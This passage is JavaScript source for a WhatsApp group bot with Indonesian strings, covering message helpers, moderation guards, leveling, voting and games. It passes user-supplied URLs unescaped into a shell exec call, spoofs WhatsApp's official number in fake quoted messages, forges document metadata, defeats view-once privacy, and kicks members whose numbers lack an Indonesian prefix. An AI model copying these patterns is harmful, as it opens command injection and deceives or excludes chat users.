'orderId': '0@s.whatsapp.net',
'thumbnail': fs.readFileSync('./stik/reply.jpg'),
'itemCount': jumlahTroli,
'status': 1,
'surface': 1,
'message':teks,
'orderTitle': fake,
'sellerJid': `0@s.whatsapp.net`,
'token': 'notoken',
}
}, {
'quoted': dev,
'contextInfo': forward
});
xdev.relayWAMessage(yakult)  
} else if(replyType === "mess"){
xdev.sendMessage(from, teks, text, { quoted: dev });
} else if(replyType === "quoted"){
xdev.sendMessage(from, teks, text, { quoted: setQuoted });
} else  if(replyType === "video"){
xdev.sendMessage(from, teks, text, { quoted: dev, contextInfo: { externalAdReply: { title: `${fake}`, body: `${copyright}`, thumbnailUrl: '', thumbnail: thumb, mediaType:"2", previewType: "VIDEO", mediaUrl: "https://youtu.be/nLEYHaaB6x0"}}})
} else {
xdev.sendMessage(from, "Error SetReply Tidak Di Temukan", text)
}
}
            
//SENDKONTAK
const sendKontak = (from, nomor, nama, org = "") => {
const vcard ="BEGIN:VCARD\n" +"VERSION:3.0\n" + "FN:" +nama +"\n" +"ORG:" + org + "\n" +"TEL;type=CELL;type=VOICE;waid=" +nomor + ":+" +nomor +"\n" +"END:VCARD";
xdev.sendMessage(from, { displayname: nama, vcard: vcard }, MessageType.contact,{ quoted: dev });
};

//******************* 》BUTTON CMD《 ********************\\
   
///Button Text
const sendButMessage = (id, text1, desc1, but = []) => {
const buttonMessage = {
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 1,
}
xdev.sendMessage(id, buttonMessage, MessageType.buttonsMessage, {quoted: setQuoted})
}

///Button Image
const sendButImage = async(id, text1, desc1, gam1, but = [], options1 = {}) => {
kma = gam1
mhan = await xdev.prepareMessage(from, kma, image)
locmhan = mhan.message["ephemeralMessage"] ? mhan.message.ephemeralMessage : mhan
const buttonMessages = {
imageMessage: locmhan.message.imageMessage,
contentText:  text1,
footerText: desc1,
buttons: but,
headerType: 4
}
xdev.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options1)
}

///Button Video
const sendButVideo = async(id, text1, desc1, vid1, but = [], options = {}) => {
kma = vid1
mhan = await xdev.prepareMessage(from, kma, video)
locmhan = mhan.message["ephemeralMessage"] ? mhan.message.ephemeralMessage : mhan
 buttonMessages = {
videoMessage: locmhan.message.videoMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 5
}
xdev.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}

//Button Location
const sendButLocation = async (id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await xdev.prepareMessage(id, {jpegThumbnail: kma}, MessageType.location)
locmhan = mhan.message["ephemeralMessage"] ? mhan.message.ephemeralMessage : mhan
buttonMessages = {
locationMessage: locmhan.message.locationMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 'LOCATION',
}
xdev.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
					
					
//Button document
const Sendbutdocument = async(id, text1, desc1, gam1, but = [], options = {}) => {	

if(docType === "pptx"){
var AppType = "application/vnd.openxmlformats-officedocument.presentationml.presentation"
} else if(docType === "xlsx"){
var AppType = "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
} else if(docType === "zip"){
var AppType = "application/zip"
} else if(docType === "pdf"){
var AppType = "application/pdf"
} else if(docType === "docx"){
var AppType = "application/vnd.openxmlformats-officedocument.wordprocessingml.document"
}

xdev.sendMessage(id, { 
contentText: text1, 
footerText: desc1,
buttons: but, 
"headerType": "DOCUMENT", 
"documentMessage": { 
"url": "https://mmg.whatsapp.net/d/f/Ano5cGYOFQnC51uJaqGBWiCrSJH1aDCi8-YPQMMb1N1y.enc", 
"mimetype": AppType, 
"title": "Footer text", 
"fileSha256": "8Xfe3NQDhjwVjR54tkkShLDGrIFKR9QT5EsthPyxDCI=", 
"fileLength": 999999999999, 
"pageCount": 100, 
"mediaKey": "XWv4hcnpGY51qEVSO9+e+q6LYqPR3DbtT4iqS9yKhkI=", 
"fileName": namaDocument, 
"fileEncSha256": "NI9ykWUcXKquea4BmH7GgzhMb3pAeqqwE+MTFbH/Wk8=", 
"directPath": "/v/t62.7119-24/35160407_568282564396101_3119299043264875885_n.enc?ccb=11-4&oh=d43befa9a76b69d757877c3d430a0752&oe=61915CEC", 
"mediaKeyTimestamp": "1634472176", 
"jpegThumbnail": gam1}}, 
MessageType.buttonsMessage, options)
}
 
//Katalog menu
const sendKatalog = async (deskripsi ) => {   
hmm4 = fs.readFileSync('./stik/thumb.jpeg')
imeu =   await xdev.prepareMessage('0@s.whatsapp.net', hmm4, image, { thumbnail : fs.readFileSync(`./stik/fake.jpeg`)}), 
imeg = imeu.message.imageMessage
res =   xdev.prepareMessageFromContent(from, {
'productMessage': {
'product': {
'productImage': imeg,
'productId': 'IDR',
'title': fake,
'description': deskripsi,
'retailerId': copyright,
'itemCount': jumlahTroli,
'priceAmount1000': '1000',
'descriptionCount': 1,
'productImageCount': '1'
},
'businessOwnerJid': `${nomerOwner}@s.whatsapp.net`        
}
}, {
contextInfo: forward,
quoted: setQuoted
 }), 
 xdev.relayWAMessage(res)         
}

//Troli menu
const sendTroli = async (deskripsi ) => {
var sendnih = xdev.prepareMessageFromContent(from, {
'orderMessage': {
'orderId': '0@s.whatsapp.net',
'thumbnail': fs.readFileSync(`./stik/fake.jpeg`),
'itemCount': jumlahTroli,
'status': 1,
'surface': 1,
'message':deskripsi,
'orderTitle': fake,
'sellerJid': `0@s.whatsapp.net`,
'token': 'notoken',
}
}, {
'quoted': setQuoted,
'contextInfo': forward,
});
xdev.relayWAMessage(sendnih)    
}

//SendBc
const sendBc = async(id, text1, desc1, gam1, but = [], options = {}) => {	
if(setBc === "document") {
Sendbutdocument(id, text1,desc1,gam1, but, options)
 } else  if(setBc === "lokasi") {  
sendButLocation(id, text1,desc1,fs.readFileSync('./stik/fake.jpeg'), but, options)
} else if(setBc === "troli") {
sendButMessage(id, text1, desc1, but)
} else {
xdev.sendMessage(id, `${text1}\n\n${desc1}`, text)
}
}


//******************* 》FAKE MESSAGE《 ********************\\
const sendvn = (teks) => {
xdev.sendMessage(from, teks, audio, {mimetype: 'audio/mp4', thumbnail: fs.readFileSync('./stik/fake.jpeg'), quoted: dev, ptt: true})
}     
const reply = (teks) => {
xdev.sendMessage(from, teks, text, { quoted: dev });
};
const sendMess = (teks) => {
xdev.sendMessage(from, teks, text)
}
const mentions = (teks, memberr, id) => {
(id == null || id == undefined || id == false) ? xdev.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : xdev.sendMessage(from, teks.trim(), extendedText, { quoted: dev, contextInfo: { "mentionedJid": memberr, forwardingScore: totalForward, isForwarded: forwarding } })
}
const costum = (pesan) => {
if (Loading){
xdev.sendMessage(from, pesan, text, {quoted: { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `*${fake}*`, 'jpegThumbnail': fs.readFileSync('./stik/fake.jpeg')}}}})
} 
}
const sendSticker = (pesan) => {
xdev.sendMessage(from, pesan, sticker, {quoted: dev, contextInfo: forward})
}
const sendSticker1 = (pesan) => {
xdev.sendMessage(from, pesan, sticker)
}
const math = (teks) => {
return Math.floor(teks)
}  
const sendVideo = (teks) => {
xdev.sendMessage(from, teks, video, { quoted: dev });
};       
const sendGif = (teks, teksnya) => {
xdev.sendMessage(from, teks, video, { caption: teksnya, mimetype: Mimetype.gif, quoted: dev });
};        
const sendAudio = (file) => {
xdev.sendMessage(from, file, audio, { mimetype: 'audio/mp4', quoted: dev });
};   


 
//onlyOwner
const onlyOwner = async() =>{
if(autovn){
sendvn(gakmau)
}else if(autosticker){
sendSticker(gaboleh)
} else if(typing){
setReply(mess.only.ownerB)
}else {
setReply(mess.only.ownerB)
}
}
 
 
//******************* 》FUNCTION《 ********************\\

const sendStickerUrl = async(to, url) => {
console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Downloading sticker...'))
var names = getRandom('.webp')
var namea = getRandom('.png')
var download = function (uri, filename, callback) {
request.head(uri, function (err, res, body) {
request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
mime = res.headers['content-type']
});
};
download(url, namea, async function () {
let filess = namea
let asw = names
require('./lib/exif.js')
if(mime === "image/gif"){
ranp = getRandom('.gif')
rano = getRandom('.webp')
exec(`wget ${url} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
fs.unlinkSync(ranp)
if (err) return setReply(`${err}`)
xdev.sendMessage(to, fs.readFileSync(rano), sticker, {quoted: dev})
fs.unlinkSync(rano)
})
} else {

exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
exec(`webpmux -set exif ./sticker/data.exif ${asw} -o ${asw}`, async (error) => {
let media = fs.readFileSync(asw)
xdev.sendMessage(to, media, sticker, dev)
console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Succes send sticker...'))
fs.unlinkSync(names)
fs.unlinkSync(namea)
});
});

}
});
}
         

           
const sendMediaURL = async(to, url, text="", mids=[]) =>{
if(url == undefined) return setReply("Url undefined")
if(mids.length > 0){
text = normalizeMention(to, text, mids)
}
const fn = Date.now() / 10000;
const filename = fn.toString()
let mime = ""
var download = function (uri, filename, callback) {
request.head(uri, function (err, res, body) {
mime = res.headers['content-type']
request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
});
};
download(url, filename, async function () {
console.log('done');
let media = fs.readFileSync(filename)
let type = mime.split("/")[0]+"Message"
if(mime === "image/gif"){
 type = MessageType.video
 mime = Mimetype.gif
} else if(mime === "application/pdf"){
 type = MessageType.document
 mime = Mimetype.pdf
} else if(mime === "application/zip"){
 type = MessageType.document
 mime = "application/zip"
} else if(mime.split("/")[0] === "audio"){
 type = MessageType.audio
 mime = Mimetype.mp4Audio        
} else {
 setReply("Mimetype tidak di temukan")
}
xdev.sendMessage(to, media, type, { quoted: dev, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
fs.unlinkSync(filename)
});
}
            
const sendFileFromUrl = async(link, type, options) => {         
hasil = await getBuffer(link)
await xdev.sendMessage(from, hasil, type, options).catch(e => {
fetch(link).then((hasil) => {
xdev.sendMessage(from, hasil, type, options).catch(e => {
xdev.sendMessage(from, { url : link }, type, options).catch(e => {
setReply("_[ ! ] Error Gagal Dalam Mendownload Dan Mengirim Media_")
console.log(e)
})
})
})
})
}

            

         
//******************* 》SECURITY《 ********************\\
            
//ANTI VIO 
if (!dev.key.fromMe && isGroup && isAntiviewonce && m.mtype == "viewOnceMessage") {       	
setReply(`@${sender.split("@")[0]} Terdeteksi mengirim gambar/video viewonce!`);
var msg = { ...dev };
msg.dev = dev.message.viewOnceMessage.message;
msg.dev[Object.keys(msg.dev)[0]].viewOnce = false;
xdev.copyNForward(m.chat, msg);
}
 
//ANTI HIDETAG
if (isGroup && isAntihidetag && m.message[m.mtype]?.contextInfo?.mentionedJid?.length == groupMembers.length) {    
if (isGroupAdmins) return setReply('Admin bebas pakai hidetag dong :v')
console.log( color("[ANTI-HIDETAG]", "red"), color(`@${sender.split("@")[0]} mengirim pesan hidetag`, "cyan") );
setReply(`Maaf, Botz akan mengeluarkan kamu karena kamu terdetaksi mengirim pesan hidetag`);
setTimeout(() => {
xdev.groupRemove(from, [sender]);
},3000)
}
       
//ANTI TROLI 
if (m.message  && !m.key.fromMe && m.isBaileys && m.quoted && m.quoted.mtype === 'orderMessage' && !(m.quoted.token && m.quoted.orderId)) {
if (antibugtroli === false) return
if(jeda === true) return
jeda = true
m.reply('Troli Detected\n\n' + require('util').format(m.key))
await xdev.modifyChat(m.chat, 'delete', {
includeStarred: false
})
setTimeout( () => {
jeda = false
},2000)
}

//ANTI BADWORD 
if (isGroup && Toxic && !isOwner && !isGroupAdmins && !dev.key.fromMe){ 
if (badword.includes(messagesC)) {
if (isCountKasar(sender, senbadword)){
if (!isBotGroupAdmins) return setReply(`Kamu beruntung karena bot bukan admin`)
setReply(`*「 ANTI BADWORD 」*\n\nSepertinya kamu sudah berkata kasar lebih dari 5x, maaf kamu akan di kick`)
setTimeout( () => {
xdev.groupRemove(from, [sender])
},1000)
delCountKasar(sender, senbadword)
} else {
addCountKasar(sender, senbadword)
setReply(`Kamu terdeteksi berkata kasar\nJangan ulangi lagi atau kamu akan dikick oleh botz`)
}
}
}
           
//ANTI VIRUS
if (isGroup && AntiVirtex && budy.length > 20000) {
if (isGroupAdmins) return setReply('*VIRTEX DETECTED*')
console.log(color('[KICK]', 'red'), color('Received a virus text!', 'yellow'))
await xdev.modifyChat(from, ChatModification.delete)                 
await xdev.sendMessage(from, antivirus(pushname,groupName), text)
if (!isBotGroupAdmins) return 
if(isOwner) return 
await xdev.groupRemove(from, [sender])
await xdev.groupSettingChange(from, GroupSettingChange.messageSend, true)
await sendMess("Group Telah Di Tutup")
await xdev.sendMessage(`${nomerOwner}@s.whatsapp.net`, `Hai Owner! wa.me/${sender.split("@")[0]} Terdeteksi Telah Mengirim Virtex ${isGroup?`di Group ${groupName}`:''}`, text)
 }
 
 
//Auto clear jika terdapat pesan yg tidak dapat dilihat oleh whatsapp web
if(dev.messageStubType){
if (dev.messageStubType === 68) {
console.log(color("Auto clear chat, virtex terdeteksi"))
await xdev.clearMessage(dev.key)
}
} 
  
 //ANTI LINK GROUP
if (isGroup && isAntilinkGc && budy.includes(`chat.whatsapp.com`)) {
if (isGroupAdmins) return setReply('Alah sia admin grup mah bebas yekan :v')
linkgc = await xdev.groupInviteCode(from)
if (budy.includes(`${linkgc}`)) return reply ('Wuanjir kirain link grup lain, huh hampir aja kena kick 😆')
if (budy.includes('zin admin') || budy.includes('zinmin') )return setReply('Izin Admin diterima')
var kic = `${sender.split("@")[0]}@s.whatsapp.net`
setReply(` *「 LINK GROUP DETECTED 」*\nKamu mengirimkan link group, maaf kamu di kick dari grup :(`)
setTimeout(() => {
xdev.groupRemove(from, [kic]).catch((e) => { setReply(`BOT HARUS JADI ADMIN`) })
}, 2000)
}   

 //ANTI LINK 
if (isGroup && isAntiLink){
if (budy.includes(`https:`)) { 
if (isGroupAdmins) return setReply('Alah sia admin grup mah bebas yekan :v')
linkgc = await xdev.groupInviteCode(from)
if (budy.includes(`${linkgc}`)) return reply ('Wuanjir kirain link grup lain, huh hampir aja kena kick 😆')
if (budy.includes('zin admin') || budy.includes('zinmin') )return setReply('Izin Admin diterima')
var kic = `${sender.split("@")[0]}@s.whatsapp.net`
setReply(` *「 LINK DETECTED 」*\nKamu mengirimkan link, maaf kamu di kick dari grup :(`)
setTimeout(() => {
xdev.groupRemove(from, [kic]).catch((e) => { setReply(`BOT HARUS JADI ADMIN`) })
}, 2000)
}
}

 //ANTI ASING/BULE OK
if (isGroup && isBotGroupAdmins && isKickarea && !dev.key.fromMe) {    
member = await groupMembers.map(u => u.jid)
for ( let i = 0; i <member.length; i++){  
if (member[i].slice(0,2) !== "62" ){     	
let users = await groupMembers.find(u => u.jid == member[i]) 
if (!users.groupAdmins ){
await xdev.groupRemove(from, [member[i]])     
}
}
}
}  
    

//******************* 》FUNCTION OTHERS《 ********************\\

// MUTE
if (checkDataId ("mute", from, DataId)  ){
if (!isOwner && !theOwner) return
}
    
//AFK FUNCTION
cekafk(afk)
if (!dev.key.remoteJid.endsWith('@g.us') && offline){
if (!dev.key.fromMe && !isOwner){
if (isAfk(dev.key.remoteJid)) return
addafk(dev.key.remoteJid)
heheh = ms(Date.now() - waktu) 
xdev.sendMessage(dev.key.remoteJid,`@${nomerOwner} Sedang Offline!\n\n*Alasan :* ${alasan}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`, MessageType.text,{contextInfo:{ mentionedJid: [`${nomerOwner}@s.whatsapp.net`],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": "*OFFLINE*", 'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}})
}
}   
if (dev.key.remoteJid.endsWith('@g.us') && offline) {
if (!dev.key.fromMe && !isOwner){
if (dev.message.extendedTextMessage != undefined){
if (dev.message.extendedTextMessage.contextInfo != undefined){
if (dev.message.extendedTextMessage.contextInfo.mentionedJid != undefined){
for (let ment of dev.message.extendedTextMessage.contextInfo.mentionedJid) {
if (ment === `${nomerOwner}@s.whatsapp.net`){
if (isAfk(dev.key.remoteJid)) return
addafk(dev.key.remoteJid)
heheh = ms(Date.now() - waktu)
xdev.sendMessage(dev.key.remoteJid,`@${nomerOwner} Sedang Offline!\n\n *Alasan :* ${alasan}\n *Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`, MessageType.text,{contextInfo:{ mentionedJid: [`${nomerOwner}@s.whatsapp.net`],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": "*OFFLINE*", 'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}})
}
}
}
}
}
}
}
  
   
//BOT FUNCTION
const oawalah =['iya kak ?','Ada apa kak ?','Bot aktif kak','Aku bukan bot kak, aku ini hooman','Kumaha atuh kak ?','Kunaon kak ?','oy ?','ya ?','Kenapa panggil aku','Ada apa kak kok panggil aku','Naon siah kehed manggil manggil']
const hayuk = oawalah[Math.floor(Math.random() * oawalah.length)]
  
//VOTING FUNCTION
if(isGroup && !isVote) {
if (budy.toLowerCase() === 'vote'){
let vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`))
let _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`))  
let fil = vote.map(v => v.participant)
let id_vote = sender ? sender : '6285751056816@s.whatsapp.net'
if(fil.includes(id_vote)) {
return mentions('@'+sender.split('@')[0]+' Anda sudah vote', fil, true)
} else {
vote.push({
participant: id_vote,
voting: '✅'
})
fs.writeFileSync(`./lib/${from}.json`,JSON.stringify(vote))
let _p = []
let _vote = '*Vote* '+ '@'+ _votes[0].votes.split('@')[0] + `\n\n*Alasan*: ${_votes[0].reason}\n*Jumlah Vote* : ${vote.length} Vote\n*Durasi* : ${_votes[0].durasi} Menit\n\n` 
for(let i = 0; i < vote.length; i++) {
_vote +=  `@${vote[i].participant.split('@')[0]}\n*Vote* : ${vote[i].voting}\n\n`
_p.push(vote[i].participant)
 }  
_p.push(_votes[0].votes)
mentions(_vote,_p,true)   
}
} else if (budy.toLowerCase() === 'devote'){
const vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`))
let _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`))  
let fil = vote.map(v => v.participant)
let id_vote = sender ? sender : '6285751056816@s.whatsapp.net'
if(fil.includes(id_vote)) {
return mentions('@'+sender.split('@')[0]+' Anda sudah vote', fil, true)
} else {
vote.push({
participant: id_vote,
voting: '❌'
})
fs.writeFileSync(`./lib/${from}.json`,JSON.stringify(vote))
let _p = []
let _vote = '*Vote* '+ '@'+ _votes[0].votes.split('@')[0] + `\n\n*Alasan*: ${_votes[0].reason}\n*Jumlah Vote* : ${vote.length} Vote\n*Durasi* : ${_votes[0].durasi} Menit\n\n` 
for(let i = 0; i < vote.length; i++) {
_vote +=  `@${vote[i].participant.split('@')[0]}\n*Vote* : ${vote[i].voting}\n\n`
_p.push(vote[i].participant)
}  
_p.push(_votes[0].votes)
mentions(_vote,_p,true)   
}
}
}	
 
//PUBLIC
if (publik === false) {
if (!dev.key.fromMe && !isOwner && !theOwner) return
}

//BAN CHAT
if (isBanchat){
if (!isOwner && !theOwner && !isGroupAdmins) return
}

if(cekBannedUser(sender, ban) && !isOwner) return
if(cekSpam("Case",senderNumber, AntiSpam)) return
SpamExpired(senderNumber, "NotCase", AntiSpam)
SpamExpired(senderNumber, "Case", AntiSpam)
expiredClaim(_claim)
       
//ANTI SPAM PRIVATE CHAT
if (isCmd && msgFilter.isFiltered(from) && !isGroup && !dev.key.fromMe && !isOwner) {
console.log(color('[SPAM]', 'red'), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color(`${command} [${args.length}]`), 'dari', color(pushname))
addSpam("Case",senderNumber, "30s", AntiSpam)
console.log(color('[SPAM]', 'red'), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color(`Berhasil banned ${pushname} sementara`))
if(autovn && !nopref) {
return sendvn(nospam)
} else if(!autovn && !nopref){
return setReply(textspam)
}
}
//ANTI SPAM GROUP CHAT     
if (isCmd && msgFilter.isFiltered(from) && isGroup && !dev.key.fromMe && !isOwner) {
console.log(color('[SPAM]', 'red'), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color(`${command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
addSpam("Case",senderNumber, "30s", AntiSpam)
console.log(color('[SPAM]', 'red'), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color(`Berhasil banned user sementara`), 'from', color(pushname))
if(autovn && !nopref) {
return sendvn(nospam)
} else if(!autovn && !nopref){
return setReply(textspam)
}
}
if (isCmd && !isOwner) msgFilter.addFilter(from)

   
//------------------ 》AUTO SYSTEM《 ------------------\\

//AUTO BIO
if(autobio){ 
runoy = process.uptime() 
xdev.setStatus(`${fake} | ⏰ ${kyun(runoy)} | 🔋 ${baterai.battery}`).catch((_)=>_);
}
   
//AUTO REGISTER && !dev.key.fromMe && !isOwner  && isCmd
if (!isHit ){ 
addUserId(gcount, limitCount, calender, pushname, senderNumber, user)
}
   
//Auto Hit 
if(command){
AddHit(senderNumber, user)
cmdAdd("run", "1d", hitnya)
}
expiredCmd(hitnya)
const thisHit = `${getHit("run", hitnya)}`




//--------------------------AREA EXP USER------------------------\\


//Exp User
if ( isHit && !itsMe && !isCmd ||  isHit && !itsMe && command ) {

//Auto clear chat
if(AutoClearChat &&  !checkAutoClear("AutoClearChat", hitnya)){
console.log(`add autoclear chat`)
addAutoClear("AutoClearChat", "1d", hitnya) 
}
//Auto add Dssboard
for (let dash of features){
if(command == dash){
addDb(command, Dashboard) 
}
}       


try {
if (userLevel === undefined && userId === undefined) {
addUserId(gcount, limitCount, calender, pushname, senderNumber, user)
}

if (autoLevel){
addLevelingXp(senderNumber, amountExp, user)
}
if (autoLevel && userExp >= requiredExp || autoLevel && userExp == requiredExp) {
addLevelingLevel(senderNumber, 1, user)
resetLevelingXp(senderNumber, userExp, user)


anune =`${userLevel}000`
susu = randomNomor(math(anune))
addBalance(senderNumber, susu, user)


//Hadiah Limit
if(userLevel >= 25){
anuitu =`${userLevel}`
 sapi = randomNomor(math(anuitu))
giveLimit(senderNumber, sapi, user)
} else {
sapi = "0"
}


//Hadiah Premium
if(userLevel >= 50){
nana = randomNomor(24) + "h"
_prem.addPremiumUser (sender, nana, premium)         
} else {
	nana = "0"
}

levelnih = userLevel + 1

teks = `*]───「 LEVEL UP 」───[*

Selamat, kamu telah naik ke level ${levelnih}
Pangkatmu saat ini adalah 「 *${userLeveling(levelnih)}* 」
Dan kamu telah mendapatkan
💳 Saldo  : Rp ${susu}
📉 Limit : ${sapi}
🎫 Premium : ${nana.split("h")[0]} Jam`
but = [{ buttonId: `${prefix}myprofile`, buttonText: { displayText: `ᴘʀᴏғɪʟᴇ` }, type: 1 },{ buttonId: `${prefix}shop`, buttonText: { displayText: `sʜᴏᴘ` }, type: 1 } ];         
await setReply(teks)
}
} catch (err) {
console.error(err)
}
}

if(AutoClearChat){
autoClearChat( totalchat, xdev, ChatModification, hitnya)
}


//-----------------------------------------AKHIR BATAS EXP USER-->





//AUTO TYPING & RECORDING
if (isCmd && autovn){
xdev.updatePresence(from, Presence.recording)
} else if (isCmd && typing){
xdev.updatePresence(from, Presence.composing)
} else {
xdev.updatePresence(from, Presence.avaible)
}

//AUTO BLOCK CMD
for (let i = 0; i < listcmdblock.length ; i++) {
if (command === listcmdblock[i].cmd ){
if(autoblockcmd) {
return setReply(mess.block.Bsystem)
} else{
return setReply(mess.block.Bowner)
}
}
}

//AUTO RESPON
for (let i = 0; i < commandsDB.length ; i++) {
if (budy == commandsDB[i].pesan) {
xdev.sendMessage(from, commandsDB[i].balasan, text, {quoted: dev})
}
}
    
    
//AUTO RESPON STICKER
if (setiker.includes(messagesC)){
if(isExtream) return
namastc = messagesC
buffer = fs.readFileSync(`./temp/stick/${namastc}.webp`)
xdev.sendMessage(from, buffer, sticker, {quoted:dev })
}
	
//AUTO RESPON VN
for (let anju of audionye){
if (budy === anju){
if (cekSpam("NotCase",senderNumber, AntiSpam)) return sendSticker(spam2)
buffer = fs.readFileSync(`./temp/audio/${anju}.mp3`)
xdev.sendMessage(from, buffer, audio, {mimetype: 'audio/mp4', quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${pushname} \n「 audio 」 ${anju}`,"title": `Hmm`,'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}, ptt: true, contextInfo: forward})
addSpam("NotCase",senderNumber, "10s", AntiSpam)
}
}
	   
//AKSES PRIVATE 
if (!isGroup && !isOwner && !isPremium && isCmd && chatBot === true) { 
if(autovn) {
sendvn(gakmau)
} else {
setReply(teksChat)
}
}

//Suit PvP Copas dari Dika Ardnt awokawok
this.suit = this.suit ? this.suit : {}
let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
if (roof) {
let win = ''
let tie = false

if (m.sender == roof.p2 && budy.includes("olak") && m.isGroup && roof.status == 'wait') {
mentions(`@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`,[roof.p2], true)
delete this.suit[roof.id]
}

if (m.sender == roof.p2 && budy.includes("erima") && m.isGroup && roof.status == 'wait') {
roof.status = 'play'
roof.asal = from
clearTimeout(roof.waktu)
//delete roof[roof.id].waktu
teks = `Silahkan pilih \n\nBatu\nKertas\nGunting`
let mok = [{"buttonId": "batu","buttonText": {"displayText": `ʙᴀᴛᴜ`},"type": "RESPONSE"},
                    {"buttonId": "gunting","buttonText": {"displayText": `ɢᴜᴛɪɴɢ`},"type": "RESPONSE"},
                     {"buttonId": "kertas","buttonText": {"displayText": `ᴋᴇʀᴛᴀs`},"type": "RESPONSE"}
                    ]
                    
mentions(`Suit telah dikirimkan ke chat

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing"
klik wa.me/${botNumber.split`@`[0]}`, [roof.p, roof.p2], true)

if (!roof.pilih) sendButMessage (roof.p, teks, copyright, mok) 
if (!roof.pilih2) sendButMessage (roof.p2, teks, copyright, mok) 
roof.waktu_milih = setTimeout(() => {
if (!roof.pilih && !roof.pilih2) mentions( `Kedua pemain tidak niat main,\nSuit dibatalkan`, [roof.p, roof.p2], true)
else if (!roof.pilih || !roof.pilih2) {
win = !roof.pilih ? roof.p2 : roof.p
mentions(`@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, [(roof.pilih ? roof.p2 : roof.p)], true)
}
delete this.suit[roof.id]
//return !0
}, roof.timeout)
}
let jwb = m.sender == roof.p
let jwb2 = m.sender == roof.p2
let g = /gunting/i
let b = /batu/i
let k = /kertas/i
let reg = /^(gunting|batu|kertas)/i 


if (jwb && reg.test(m.text)  && !roof.pilih && !m.isGroup) {
roof.pilih = reg.exec(m.text.toLowerCase())[0]
roof.text = m.text
m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih2) xdev.sendMessage(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', text)
}

if (jwb2 && reg.test(m.text)   && !roof.pilih2 && !m.isGroup) {
roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
roof.text2 = m.text
m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih) xdev.sendMessage(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', text)
}



let stage = roof.pilih
let stage2 = roof.pilih2
if (roof.pilih && roof.pilih2) {
clearTimeout(roof.waktu_milih)
if (b.test(stage) && g.test(stage2)) win = roof.p
else if (b.test(stage) && k.test(stage2)) win = roof.p2
else if (g.test(stage) && k.test(stage2)) win = roof.p
else if (g.test(stage) && b.test(stage2)) win = roof.p2
else if (k.test(stage) && b.test(stage2)) win = roof.p
else if (k.test(stage) && g.test(stage2)) win = roof.p2
else if (stage == stage2) tie = true
xdev.sendMessage(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}
`.trim(), text, { contextInfo: { mentionedJid: [roof.p, roof.p2] }})
delete this.suit[roof.id]
}
}
	
//Anonymouse Function, meneruskan pesan ke users
this.anonymous = this.anonymous ? this.anonymous : {}
let room = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
if (room && !isCmd && !isGroup) {
let other = [room.a, room.b].find(user => user !== m.sender)
m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
